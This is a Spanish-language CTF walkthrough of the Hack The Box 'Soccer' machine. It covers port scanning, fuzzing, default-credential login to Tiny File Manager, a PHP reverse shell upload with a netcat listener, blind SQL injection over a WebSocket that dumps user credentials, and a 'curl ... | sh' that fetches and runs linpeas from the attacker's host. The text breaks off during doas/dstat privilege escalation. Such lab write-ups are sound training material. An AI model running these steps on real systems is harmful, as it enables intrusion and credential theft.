---
layout: single
title: Soccer - Hack The Box
excerpt: "Una máquina que, al chile deberia ser de dificultad media porque fácil no fue, lo que hicimos fue registrar la página del puerto HTTP en el /etc/hosts, luego vamos a utilizar Fuzzing para descubrir un login, que nos muestra el servicio Tiny File Manager. Accederemos usando las credenciales por defecto de este servicio y cargaremos una Reverse Shell hecha en PHP en la carpeta Uploads del servicio para poder conectarnos de manera remota a la máquina. Dentro buscaremos el directorio del servicio Nginx para descubrir una subpágina, la cual nos permitirá crear un usuario y loguearnos en ella, dentro de esta subpágina encontraremos en el código fuente que usa un Web Socket, usaremos el ataque Blind SQL Injection para capturar las credenciales del usuario de la máquina. Una vez dentro de la máquina, usaremos la herramienta linpeas.sh para descubrir una forma de escalar privilegios, siendo que usaremos el programa Doas para que active un script que nosotros haremos que cambiara los privilegios de la Bash, para que cuando nos conectemos ahí, sea como Root."
date: 2023-04-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-soccer/soccer_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Virtual Hosting
  - Fuzzing
  - Tiny File Manager
  - PHP Reverse Shell
  - Nginx
  - Web Socket Exploit
  - Blind SQL Injection
  - LinPEAS
  - Doas Privilege Escalation
  - OSCP Style
---
![](/assets/images/htb-writeup-soccer/soccer_logo.png)

Una máquina que, al chile deberia ser de dificultad media porque fácil no fue, lo que hicimos fue registrar la página del puerto HTTP en el **/etc/hosts**, luego vamos a utilizar **Fuzzing** para descubrir un login, que nos muestra el servicio **Tiny File Manager**. Accederemos usando las credenciales por defecto de este servicio y cargaremos una Reverse Shell hecha en PHP en la carpeta **Uploads** del servicio para poder conectarnos de manera remota a la máquina. Dentro buscaremos el directorio del servicio **Nginx** para descubrir una subpágina, la cual nos permitirá crear un usuario y loguearnos en ella, dentro de esta subpágina encontraremos en el código fuente que usa un **Web Socket**, usaremos el ataque **Blind SQL Injection** para capturar las credenciales del usuario de la máquina. Una vez dentro de la máquina, usaremos la herramienta **linpeas.sh** para descubrir una forma de escalar privilegios, siendo que usaremos el programa **Doas** para que active un script que nosotros haremos que cambiara los privilegios de la Bash, para que cuando nos conectemos ahí, sea como Root.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
				<li><a href="#STFM">Investigación Servicio Tiny File Manager</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#SSH">Enumeración Servicio SSH</a></li>
				<li><a href="#SQL">Aplicando SQL Inyection</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL sabremos que SO utiliza.
```
ping -c 4 10.10.11.194   
PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=137 ms
64 bytes from 10.10.11.194: icmp_seq=2 ttl=63 time=166 ms
64 bytes from 10.10.11.194: icmp_seq=3 ttl=63 time=134 ms
64 bytes from 10.10.11.194: icmp_seq=4 ttl=63 time=134 ms

--- 10.10.11.194 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3010ms
rtt min/avg/max/mdev = 133.627/142.699/165.802/13.420 ms
```
Por el TTL sabemos que usa Linux. Hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.194 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 10:33 CST
Initiating SYN Stealth Scan at 10:33
Scanning 10.10.11.194 [65535 ports]
Discovered open port 80/tcp on 10.10.11.194
Discovered open port 22/tcp on 10.10.11.194
Completed SYN Stealth Scan at 10:33, 26.80s elapsed (65535 total ports)
Nmap scan report for 10.10.11.194
Host is up, received user-set (0.80s latency).
Scanned at 2023-04-12 10:33:06 CST for 27s
Not shown: 52005 filtered tcp ports (no-response), 13528 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.90 seconds
           Raw packets sent: 125161 (5.507MB) | Rcvd: 13657 (546.320KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Vemos únicamente 2 puertos abiertos, como no tenemos credenciales del servicio SSH tendremos que irnos por la página web, pero antes hagamos el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```
nmap -sC -sV -p22,80 10.10.11.194 -oN targeted                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 10:34 CST
Nmap scan report for 10.10.11.194
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.77 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Vaya, vaya, la máquina está usando **nginx 1.18.0** cómo en la **máquina Precious**, tengámoslo en cuenta por si las dudas.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Puerto 80</h2>

Vamos a entrar a la página web.

No nos deja ver nada, entonces vamos a registrar el dominio en el **/etc/hosts**
```
nano /etc/hosts
10.10.11.194 soccer.htb
```
Bien, recarguemos la página a ver si ahora sí se ve algo:

![](/assets/images/htb-writeup-soccer/Captura1.png)

Muy bien, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-soccer/Captura2.png">
</p>

No veo algo que nos pueda ser útil, veamos si la herramienta **whatweb** nos dice algo más:
```
whatweb http://soccer.htb/  
http://soccer.htb/ [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
No pues no, entonces hagamos un **Fuzzing**.

<h2 id="Fuzz">Fuzzing</h2>

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://soccer.htb/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        147 L    526 W      6917 Ch     "# directory-list-2.3-medium.txt"                                     
000000003:   200        147 L    526 W      6917 Ch     "# Copyright 2007 James Fisher"                                       
000000007:   200        147 L    526 W      6917 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000014:   200        147 L    526 W      6917 Ch     "http://soccer.htb//"                                                 
000000012:   200        147 L    526 W      6917 Ch     "# on atleast 2 different hosts"                                      
000000010:   200        147 L    526 W      6917 Ch     "#"                                                                   
000000011:   200        147 L    526 W      6917 Ch     "# Priority ordered case sensative list, where entries were found"    
000000013:   200        147 L    526 W      6917 Ch     "#"                                                                   
000000009:   200        147 L    526 W      6917 Ch     "# Suite 300, San Francisco, California, 94105, USA."                 
000000006:   200        147 L    526 W      6917 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000008:   200        147 L    526 W      6917 Ch     "# or send a letter to Creative Commons, 171 Second Street,"          
000000005:   200        147 L    526 W      6917 Ch     "# This work is licensed under the Creative Commons"                  
000000002:   200        147 L    526 W      6917 Ch     "#"                                                                   
000000004:   200        147 L    526 W      6917 Ch     "#"                                                                   
000008034:   200        96 L     1750 W     11521 Ch    "tiny"                                                                
000045240:   200        147 L    526 W      6917 Ch     "http://soccer.htb//"                                                 

Total time: 510.4560
Processed Requests: 220560
Filtered Requests: 220544
Requests/sec.: 432.0842
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Solamente nos arrojó un resultado, veamos de que se trata:

![](/assets/images/htb-writeup-soccer/Captura3.png)

¡Tenemos un login! Y veo algo llamado **Tiny File Manager**, investiguemos de que se trata.

<h2 id="STFM">Investigación Servicio Tiny File Manager</h2>

Veamos que es este servicio:

**Administrador de archivos basado en la web en PHP, administre sus archivos de manera eficiente y fácil con Tiny File Manager, es un administrador de archivos simple, rápido y pequeño con un solo archivo.**

Bueno, es un administrador de archivos en PHP, aquí más información:

* https://tinyfilemanager.github.io/

Entonces, supongo que tendrá credenciales por defecto, busquémoslas. Aquí están:

* https://elements.heroku.com/buttons/skmdimtiaj/tinyfilemanager

Las credenciales por defecto son:

* Para admin: admin / admin@123
* Para usuario: user / 12345

Probemos primero las del admin, ponlas en el login y trata de entrar:

![](/assets/images/htb-writeup-soccer/Captura4.png)

a...Bueno, pudimos entrar ya como administrado jeje y ya podemos ver una versión del servicio **Tiny** que es la 2.4.3. Es momento de buscar un Exploit.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Buscando primero por la herramienta **Searchsploit** vemos que hay uno:
```
searchsploit tiny file manager
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross- | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                     | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                  | php/webapps/15194.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Al parecer, este Exploit es para la versión 2.4.6, aun así vamos a analizarlo:
```
searchsploit -m php/webapps/50828.sh 
  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50828
     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh
    Codes: CVE-2021-45010, CVE-2021-40964
 Verified: False
File Type: Unicode text, UTF-8 text
```
Según el Exploit, también puede funcionar con la versión 2.4.3, pero mejor busquemos por internet uno que sea específico para esta versión.

Encontré uno, incluso aquí está el Exploit para la versión 2.4.6:
* https://github.com/febinrev/tinyfilemanager-2.4.3-exploit

**IMPORTANTE**

Te voy a ahorrar el uso de estos Exploits, porque no van a servir. ¿Por qué? Porque por alguna razón que no entiendo, no nos deja subir ningún archivo que no sea dentro de la carpeta **Uploads**.

En dicha carpeta solo me acepto archivos **.php** y solo de manera temporal, es decir, que se borraran en menos de 1 minuto.

Lo que podemos hacer es, cargar un Payload hecho en PHP para así conectarnos de manera remota. Para esto, usaremos el siguiente link:
* https://github.com/pentestmonkey/php-reverse-shell

Hagamos el proceso por pasos:
* Lo descargamos:
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git       
Clonando en 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Recibiendo objetos: 100% (10/10), 9.81 KiB | 1.96 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```
* Entramos a la carpeta y al archivo:
```
cd php-reverse-shell
ls
CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.php  README.md
nano php-reverse-shell.php
```
* Cambiamos la IP y el puerto:
```
$VERSION = "1.0";
$ip = '127.0.0.1';  // CAMBIA POR TU IP
$port = 1234;       // CAMBIA ESTO POR UN PUERTO QUE QUIERAS
$chunk_size = 1400;
```
* Activamos una netcat con el puerto que pusimos:
```
nc -nvlp 443                                                    
listening on [any] 443 ...
```
*Subimos el archivo PHP a la página web, en la carpeta **Uploads**:

![](/assets/images/htb-writeup-soccer/Captura5.png)

![](/assets/images/htb-writeup-soccer/Captura6.png)

![](/assets/images/htb-writeup-soccer/Captura7.png)

![](/assets/images/htb-writeup-soccer/Captura8.png)

* Le damos click al nombre del archivo:

![](/assets/images/htb-writeup-soccer/Captura9.png)

* Le damos click en **Open**

![](/assets/images/htb-writeup-soccer/Captura10.png)

* Y ya deberíamos estar conectados:
```
nc -nvlp 443                                                    
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.194] 41962
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 19:03:20 up  2:31,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Ahora no importa si el archivo se elimina, nosotros seguiremos conectados. Vamos a hacer enumeración.

<h2 id="SSH">Enumeración Servicio SSH</h2>

**IMPORTANTE:**

Para evitar que pierdas el tiempo como yo, chale Unu, recuerda que existe el servicio **nginx** y es ahí donde encontraremos algo útil.

Bien, no podremos hacer muchas cosas, pues no somos un usuario como tal, sino que somos el servicio **Tiny File Manager**, por lo que entrar al directorio del usuario para ver la flag, será inútil.

Antes de mostrártelo, vamos a mejorar la terminal solo un poco:
```
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@soccer:/$ whoami
whoami
```
Ahora si, te muestro que no podemos hacer nada:
```
www-data@soccer:/$ cd /home
cd /home
www-data@soccer:/home$ ls
ls
player
www-data@soccer:/home$ cd player
cd player
www-data@soccer:/home/player$ ls
ls
user.txt
www-data@soccer:/home/player$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
Y es más que obvio que no podremos hacer mucho, si listamos todos los directorios junto a los permisos:
```
www-data@soccer:/$ ls -la
ls -la
total 80
drwxr-xr-x  21 root root  4096 Dec  1 18:51 .
drwxr-xr-x  21 root root  4096 Dec  1 18:51 ..
lrwxrwxrwx   1 root root     7 Nov 15 21:38 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Dec 13 07:45 boot
drwxr-xr-x   2 root root  4096 Dec  1 18:51 data
drwxr-xr-x  17 root root  3840 Apr 12 16:32 dev
drwxr-xr-x 101 root root  4096 Dec 13 07:44 etc
drwxr-xr-x   3 root root  4096 Nov 17 09:25 home
lrwxrwxrwx   1 root root     7 Nov 15 21:38 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Nov 15 21:38 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Nov 15 21:38 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Nov 15 21:38 libx32 -> usr/libx32
drwx------   2 root root 16384 Nov 15 21:42 lost+found
drwxr-xr-x   2 root root  4096 Nov 15 21:38 media
drwxr-xr-x   2 root root  4096 Nov 15 21:38 mnt
drwxr-xr-x   2 root root  4096 Nov 15 21:38 opt
dr-xr-xr-x 269 root root     0 Apr 12 16:32 proc
drwx------  10 root root  4096 Dec 13 07:41 root
drwxr-xr-x  29 root root   900 Apr 12 16:32 run
lrwxrwxrwx   1 root root     8 Nov 15 21:38 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 Nov 15 21:41 snap
drwxr-xr-x   2 root root  4096 Nov 15 21:38 srv
dr-xr-xr-x  13 root root     0 Apr 12 16:32 sys
drwxrwxrwt  12 root root  4096 Apr 12 19:09 tmp
drwxr-xr-x  14 root root  4096 Nov 15 21:39 usr
drwxr-xr-x   2 root root  4096 Nov 17 06:47 vagrant
drwxr-xr-x  14 root root  4096 Nov 17 08:06 var
```
Todo necesita permisos de Root, pero si podemos entrar a los directorios. Vamos a buscar el servicio **nginx**.

Si nos vamos al directorio **/etc** y listamos el contenido, veremos que ahí está el directorio que buscamos:
```
www-data@soccer:/etc$ ls -la
ls -la
total 856
drwxr-xr-x 101 root root       4096 Dec 13 07:44 .
drwxr-xr-x  21 root root       4096 Dec  1 18:51 ..
-rw-------   1 root root          0 Nov 15 21:38 .pwd.lock
...
-rw-r--r--   1 root root         91 Dec  5  2019 networks
drwxr-xr-x   2 root root       4096 Nov 15 21:39 newt
drwxr-xr-x   8 root root       4096 Nov 17 08:06 nginx
-rw-r--r--   1 root root        510 Nov 15 21:39 nsswitch.conf
drwxr-xr-x   2 root root       4096 Nov 15 21:38 opt
...
```
Cuando nos metamos ahí y listemos el contenido, veremos algo muy interesante:
```
www-data@soccer:/etc$ cd nginx
cd nginx
www-data@soccer:/etc/nginx$ ls -la
ls -la
total 72
drwxr-xr-x   8 root root 4096 Nov 17 08:06 .
drwxr-xr-x 101 root root 4096 Dec 13 07:44 ..
drwxr-xr-x   2 root root 4096 Nov 10 06:38 conf.d
-rw-r--r--   1 root root 1077 Feb  4  2019 fastcgi.conf
...
drwxr-xr-x   2 root root 4096 Dec  1 13:48 sites-available
drwxr-xr-x   2 root root 4096 Dec  1 13:48 sites-enabled
...
```
Esos dos directorios indican que puede existir una subpágina que no conozcamos, vamos a investigarlos:
```
www-data@soccer:/etc/nginx$ cd sites_available
cd sites_available
bash: cd: sites_available: No such file or directory
www-data@soccer:/etc/nginx$ cd sites-available
cd sites-available
www-data@soccer:/etc/nginx/sites-available$ ls -la
ls -la
total 16
drwxr-xr-x 2 root root 4096 Dec  1 13:48 .
drwxr-xr-x 8 root root 4096 Nov 17 08:06 ..
-rw-r--r-- 1 root root  442 Dec  1 13:48 default
-rw-r--r-- 1 root root  332 Nov 17 08:39 soc-player.htb
```
Bueno, encontramos algo en el directorio **sites-available** y es una subpágina llamada **soc-player.htb**. Veamos el contenido:
```
www-data@soccer:/etc/nginx/sites-available$ cat soc-player.htb
cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
            proxy_pass http://localhost:3000;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection 'upgrade';
            proxy_set_header Host $host;
            proxy_cache_bypass $http_upgrade;
        }

}
```
Ahí está el nombre del servidor, ahora podemos registrarla en el **/etc/hosts** para poder verla:
```
nano /etc/hosts
10.10.11.194 soc-player.soccer.htb
```
Y vamos a verla.

![](/assets/images/htb-writeup-soccer/Captura11.png)

Se pueden ver más cositas que en la que ya vimos, cómo un **login** y un **sign up**, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-soccer/Captura12.png">
</p>

Mira que usa **Node.js**, esa información nos podrá servir después. Por ahora, vamos a intentar registrarnos a ver si se puede:

![](/assets/images/htb-writeup-soccer/Captura13.png)

E intentemos entrar con nuestro email y contraseña:

![](/assets/images/htb-writeup-soccer/Captura14.png)

![](/assets/images/htb-writeup-soccer/Captura15.png)

Si se pudo, pero tras investigar un poco, no veo nada que nos pueda servir. En estos casos, hay que ver hasta el código fuente de la página cómo en otras máquinas.

<p align="center">
<img src="/assets/images/htb-writeup-soccer/Captura16.png">
</p>

Y mira, hay algo curioso. La subpágina está usando un **Web Socket** que se conecta al puerto 9091. Si buscamos un Exploit para el **Web Socket**, encontraremos el siguiente blog:

* https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

En resumen, lo que haremos será redirigir la data que se está transmitiendo de la subpágina hacia nosotros, utilizando un script en Python y que usara **SQL Map** para capturar información crítica. Esto se puede hacer, justamente porque la data se transmite por el **Web Socket** más no cómo en el servicio HTTP, esto lo explica en el blog, es muy interesante, así que te recomiendo leerlo atentamente. Hagamos por pasos la captura, por cierto a esto se le llama **Blind SQL Injection**.

<h2 id="SQL">Aplicando Blind SQL Inyection</h2>

* Yo voy a copiar el script que viene ahí y lo llamaré Sqlmap_Exploit.py

* En otra terminal, tendré listo el siguiente comando:
```
sqlmap -u "http://localhost:8081/?id=1" --dump-all --exclude-sysdbs
```
Con este comando, vamos a ir capturando la data de la variable **id** y se mostrara en la terminal como si fuera un **verbose**, además vamos a excluir la base de datos del sistema, es decir que va a ignorar los demás.

* Bien, activamos el script primero y esperamos unos 10 segundos:
```
python3 Sqlmap_Exploit.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```
* Ahora activa el comando de **sqlmap** y comenzará a capturar:
```
sqlmap -u "http://localhost:8081/?id=1" --dump-all --exclude-sysdbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 14:59:48 /2023-04-12/
[14:59:48] [INFO] resuming back-end DBMS 'mysql' 
[14:59:48] [INFO] testing connection to the target URL
[14:59:49] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.11.2')
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4486 FROM (SELECT(SLEEP(5)))txQM)
---
[14:59:49] [INFO] the back-end DBMS is MySQL
...
```
**IMPORTANTE**: 

Esto puede tardar un poco, así que sé paciente y a lo mejor te pregunta algo la captura, tú dale que si xd.

* ¡Y listo! Tenemos las credenciales del usuario:
```
[15:17:11] [ERROR] invalid character detected. retrying..
[15:17:11] [WARNING] increasing time delay to 4 seconds
ayer@player.htb
[15:21:18] [INFO] retrieved: 1324
[15:22:21] [INFO] retrieved: PlayerOftheMatch2022
[15:27:39] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
[15:29:19] [INFO] table 'soccer_db.accounts' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/soccer_db/accounts.csv'
[15:29:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'
[*] ending @ 15:29:19 /2023-04-12/
```

Vamos a probar estas credenciales:
```
ssh player@10.10.11.194                                            
player@10.10.11.194's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 12 21:40:39 UTC 2023

  System load:           0.0
  Usage of /:            71.1% of 3.84GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c62b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ whoami
player
```
Excelente, vamos por la flag:
```
player@soccer:~$ ls -la
total 28
drwxr-xr-x 3 player player 4096 Nov 28 22:12 .
drwxr-xr-x 3 root   root   4096 Nov 17 09:25 ..
lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
drwx------ 2 player player 4096 Nov 17 09:00 .cache
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .viminfo -> /dev/null
-rw-r----- 1 root   player   33 Apr 12 16:32 user.txt
player@soccer:~$ cat user.txt
```
Muy bien, ahora veamos como podemos escalar privilegios.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Como siempre, vamos a ver qué permisos tenemos y que archivos tienen permiso como SUDO:
```
player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
player@soccer:~$ sudo -l
[sudo] password for player: 
Sorry, user player may not run sudo on localhost.
```
Chetos, no pues no podremos hacer mucho, así que vamos a usar una herramienta útil llamada **Linpeas** que es parte de las herramientas **PEASS-ng**, estas son herramientas que pueden mostrar  vulnerabilidades en una máquina, algo así cómo el **Windows Exploit Suggester**, pero este sirve para los principales sistemas operativos.

Aquí puedes descargar el **linpeas.sh**, solo dale click y te lo descarga:
* https://github.com/carlospolop/PEASS-ng/releases/tag/20230409

Bien, ahora, como lo indica el **LinPEAS**, que viene aquí:
* https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Vamos a levantar un servidor para poder usar el **linpeas.sh**:
```
python3 -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Y dentro de la máquina víctima, usaremos **curl** para poder usarlo:
```
player@soccer:~$ curl 10.10.14.16:80/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
...
```
Poco a poco, nos dirá que vulnerabilidades tiene, pero hay una que nos va a servir mucho:
```
╔══════════╣ Checking doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
¿Qué es eso del doas.conf?

**doas es un programa para ejecutar comandos como otro usuario. El administrador del sistema puede configurarlo para otorgar privilegios a usuarios específicos para ejecutar comandos específicos.**

Entonces podemos usar este para poder darnos privilegios, busquemos donde se encuentra ese programa:
```
player@soccer:~$ find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
```
Excelente, si buscamos por GTFObins, encontramos que dentro del directorio **/usr/local/share/dstat**, es donde podemos hacer un archivo que nos dará privilegios:
* https://gtfobins.github.io/gtfobins/dstat/

Lo que vamos a hacer, será crear un archivo en Python que cambie los permisos de la Bash para ser Root, justo como lo indica el siguiente blog, de aquí saque la forma de buscar el **dstat**, un excelente blog con buenas notas, guárdenlo para el futuro:
* https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/

Hagamos el script:
```
player@soccer:/usr/local/share/dstat$ nano dstat_exploit.py
```
